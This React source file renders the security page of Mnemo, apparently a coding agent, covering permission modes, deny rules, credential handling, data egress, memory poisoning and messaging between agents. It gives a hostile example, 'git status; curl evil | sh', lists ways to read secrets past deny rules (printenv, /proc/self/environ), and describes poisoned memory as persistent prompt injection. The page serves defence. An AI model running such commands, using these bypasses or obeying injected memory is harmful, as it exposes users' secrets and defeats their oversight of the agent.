import { Cmd, DocLayout, Note, type DocSection } from "./parts";
import { REPO, VERSION } from "../site";

const sections: DocSection[] = [
  {
    id: "report",
    title: "Report a vulnerability",
    body: (
      <>
        <p>
          Please <strong>do not open a public issue</strong>. Use GitHub's private reporting: <a href={`${REPO}/security/advisories/new`}>report a vulnerability</a> (Security → Report a vulnerability on the repository).
          Say what you found, how to reproduce it and what you think it affects.
        </p>
        <p>We aim to answer within a week. A fix and a coordinated disclosure follow. Mnemo is pre-1.0 and <strong>only the latest release is supported</strong>. The machine-readable contact is <a href="/.well-known/security.txt">/.well-known/security.txt</a>.</p>
        <p>The previous Go and Node implementation lives on the <code>legacy</code> branch and is not maintained: reports about it are welcome but will not be fixed.</p>
      </>
    ),
  },
  {
    id: "may-do",
    title: "What Mnemo is allowed to do",
    body: (
      <>
        <p>Mnemo is a coding agent: it reads your files, edits them and runs shell commands as you. The model decides what to try; what stops it is the permission gate.</p>
        <div className="tablewrap">
          <table>
            <thead><tr><th scope="col">Mode</th><th scope="col">What happens</th></tr></thead>
            <tbody>
              <tr><th scope="row"><code>default</code></th><td>Asks before every edit and every command that is not clearly read-only.</td></tr>
              <tr><th scope="row"><code>accept-edits</code></th><td>Edits project files freely; still asks before commands.</td></tr>
              <tr><th scope="row"><code>plan</code></th><td>Read-only: nothing is changed.</td></tr>
              <tr><th scope="row"><code>yolo</code></th><td>Asks for nothing. Only <code>deny</code> rules in <code>permissions.json</code> still hold.</td></tr>
            </tbody>
          </table>
        </div>
        <p>Only you can change the mode; it is never a tool the model can call.</p>
        <Note tone="warn" title="The gate filters what runs; it is not a sandbox">
          Anything you approve runs with your permissions. In headless mode (<code>mnemo -p</code>) there is nobody to ask, so every call that would ask is <strong>allowed</strong>: it behaves like <code>yolo</code>,
          and only <code>deny</code> rules apply. Run <code>-p</code>, <code>--yolo</code> and best-of only in a place you can afford to lose: a container or a throwaway checkout.
        </Note>
        <h3>What the gate does and does not do</h3>
        <ul>
          <li><strong>Deny rules are a filter, best effort.</strong> A rule such as <code>env*</code> is tested against every command in a line, looking through spacing, <code>VAR=x</code> prefixes, directories, <code>sudo</code>/<code>env</code> wrappers and <code>sh -c '…'</code>, and a deny beats every mode and every allow. It does not understand every way to say the same thing (<code>printenv</code>, <code>cat /proc/self/environ</code>, <code>python -c</code>, a script written first). Deny what you mind, not one spelling of it. Inside the Python tool, a command a cell starts and a file it opens meet the same deny rules, through Python's audit hooks, which code written to get around them can.</li>
          <li><strong>Allow rules and "always" grants end on a word and never cover a compound command.</strong> <code>git status*</code> does not cover <code>git status; curl evil | sh</code>.</li>
          <li><strong><code>accept-edits</code> means edits inside this project.</strong> <code>.git</code>, <code>.pi</code>, <code>.agents</code>, <code>.mnemo</code>, <code>.github</code> and similar still ask, because what is written there runs later. Skills are always asked about.</li>
          <li><strong>Reads are free, except credentials.</strong> <code>read</code>, <code>grep</code>, <code>find</code> and <code>ls</code> never ask, but refuse Mnemo's own <code>auth.json</code>, <code>~/.ssh</code>, <code>~/.aws</code> and <code>~/.gnupg</code>. A shell command can still <code>cat</code> them if you approve it.</li>
          <li><strong>A folder's own <code>.pi/</code> extensions, settings, prompts and skills run code and steer the model</strong>, so Mnemo loads them only for a folder you have trusted. Do not trust a repository you have not read.</li>
          <li>A <code>permissions.json</code> that cannot be parsed stops all edits and commands until it is fixed, rather than quietly dropping your deny rules.</li>
        </ul>
      </>
    ),
  },
  {
    id: "leaves",
    title: "What leaves your machine",
    body: (
      <>
        <ul>
          <li><strong>Your prompts, the files and command output the model reads, and your memory's recalled facts go to the model provider you configured.</strong> That is how an agent works. Choose the provider accordingly.</li>
          <li><strong>Nothing else, unless you ask.</strong> Mnemo has no telemetry. <code>--version</code>, <code>doctor</code>, <code>--demo</code> and <code>memory status</code> open no network connection at all; only a real prompt does, and only to your provider. An MCP server over HTTP is contacted only if its entry in your own <code>mcp.json</code> says <code>"allowNetwork": true</code>; a project cannot add one.</li>
          <li>Two things reach GitHub, and only when you start them: <code>mnemo update</code> (or <code>/update</code>), which reads the latest release and runs its installer, and the daily update check, <strong>off unless you turn it on</strong> (<code>mnemo update --auto on</code>), which sends nothing about you.</li>
          <li>Memory is stored locally in a journal readable only by you and is never uploaded by Mnemo. <strong>One opt-in exception:</strong> <code>MNEMO_EMBED_URL</code> and <code>MNEMO_EMBED_MODEL</code> send the text of memories to an embedding server you choose (OpenRouter, or an Ollama on your machine) to compute embeddings. The address must be <code>https://</code> or local. A model key such as <code>OPENROUTER_API_KEY</code> never turns this on by itself.</li>
        </ul>
        <p>The <a href="/privacy">privacy policy</a> covers this website too.</p>
      </>
    ),
  },
  {
    id: "credentials",
    title: "Credentials",
    body: (
      <>
        <ul>
          <li>Keys you add with <code>/login</code> are stored in <code>~/.mnemo/agent/auth.json</code> with mode 0600.</li>
          <li><strong>Mnemo also uses credentials it finds in your environment</strong> (for example <code>ANTHROPIC_API_KEY</code>, <code>OPENAI_API_KEY</code>, <code>AWS_*</code>) and may choose that provider by default. Unset them for the session if you do not want that.</li>
          <li><strong>Commands the agent runs get an allowlisted environment, not yours.</strong> The bash tool, the Python kernel and best-of checks start with only the variables that locate things (<code>PATH</code>, <code>HOME</code>, locale, temp and toolchain folders, proxies). No model-provider key, <code>GITHUB_TOKEN</code>, <code>NPM_TOKEN</code>, <code>AWS_*</code>, <code>SSH_AUTH_SOCK</code> or project secret reaches them. Name one to hand it back: the <code>passEnv</code> setting, or <code>MNEMO_PASS_ENV=NAME</code> for one run. A named variable reaches every command, so keep the mode on <code>default</code> while it is set.</li>
          <li><strong>The Python kernel is an interpreter, not a sandbox.</strong> Each cell stops after 120 seconds (the model may ask for up to 600), stopping a turn stops the cell, and on Linux memory is capped at 8 GB (<code>MNEMO_KERNEL_MEMORY_MB</code>).</li>
          <li>Memory writes and session ingestion are redacted for common credential shapes (<code>sk-…</code>, <code>ghp_…</code>, <code>AKIA…</code>, private keys) before they are stored. Redaction is pattern-based and best effort: do not rely on it.</li>
        </ul>
      </>
    ),
  },
  {
    id: "memory-trust",
    title: "Memory is input the model trusts",
    body: (
      <>
        <p>
          What Mnemo remembers is shown to the model in later sessions, so a poisoned memory is a prompt injection that persists. Facts that look like instructions to steer, exfiltrate or hide are refused at write time,
          recalled items are labelled as candidates rather than facts, <code>/memory</code> and the memory map show what it holds, and <code>/forget</code> retires a fact. The scanner is a list of patterns: a paraphrase can get
          past it. This is defence in depth, not a guarantee.
        </p>
        <p>When other agents share the memory, a project's identity comes from its git <code>origin</code> (a repository that copies another's remote URL shares its memory), and the MCP server takes the project from each call. Only attach memory to agents and repositories you trust with all of it.</p>
      </>
    ),
  },
  {
    id: "agents",
    title: "Agents that talk to agents",
    body: (
      <>
        <p>Agents can start sub-agents, you can link top-level agents as siblings, and agents in one family can message each other. Only you link agents, from the agents page; no tool can, and an agent cannot reach one outside its family.</p>
        <ul>
          <li><strong>A message is another model's text, never an instruction.</strong> It is shown to the receiver framed as such and changes nothing about its mode, approvals or deny rules. In <code>default</code>, <code>accept-edits</code> and <code>plan</code> the receiver still asks you before an edit or a command, whoever suggested it.</li>
          <li><strong>A message can start work, within bounds.</strong> It wakes an idle agent so siblings can talk without you relaying. After 12 messages in a row since you last prompted, and once turns that messages start have spent $0.50 for an agent (sub-agents included), messages wait for your next prompt and a turn that crosses the allowance is stopped. A model that reports no price is bounded by the 12 messages only.</li>
          <li><strong>In <code>yolo</code> nothing asks</strong>, so a message can start an agent running commands while you are away. Keep <code>yolo</code> agents unlinked from agents that read untrusted text.</li>
          <li><strong>What you type into a sub-agent's pane is your own words</strong>, read after its current step. Its edits and commands still go through its gate.</li>
          <li>What agents write to each other is stripped of control and bidirectional characters and has credential shapes redacted before it is shown or delivered.</li>
        </ul>
      </>
    ),
  },
  {
    id: "verify",
    title: "Verify a download",
    body: (
      <>
        <p>Each release ships <code>SHA256SUMS</code>, and the install scripts check it before installing. Archives are built by GitHub Actions from the tagged commit and carry a build-provenance attestation:</p>
        <Cmd text={`gh attestation verify mnemo-linux-x64.tar.gz --repo AtmanMishra/Mnemo --source-ref refs/tags/v${VERSION}`} />
        <p>The checksum catches a corrupted download, not a compromised release (it is published beside the archive). The attestation is the provenance check. <a href="/download#verify">More on the download page.</a></p>
      </>
    ),
  },
  {
    id: "policy",
    title: "The full policy",
    body: (
      <p>
        This page summarises <a href={`${REPO}/blob/main/SECURITY.md`}>SECURITY.md</a> in the repository, which is the authoritative text and is versioned with the code. If they ever differ, the repository wins.
      </p>
    ),
  },
];

export function Security() {
  return (
    <DocLayout
      eyebrow="security"
      title="Security"
      lead={<>Mnemo runs commands as you, so here is what it may do, what leaves your machine, and how to tell us when something is wrong.</>}
      updated="2026-10-13"
      sections={sections}
    />
  );
}
